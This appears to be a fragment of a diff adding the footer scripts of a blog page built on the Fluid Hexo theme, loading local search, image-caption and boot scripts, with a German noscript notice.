+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
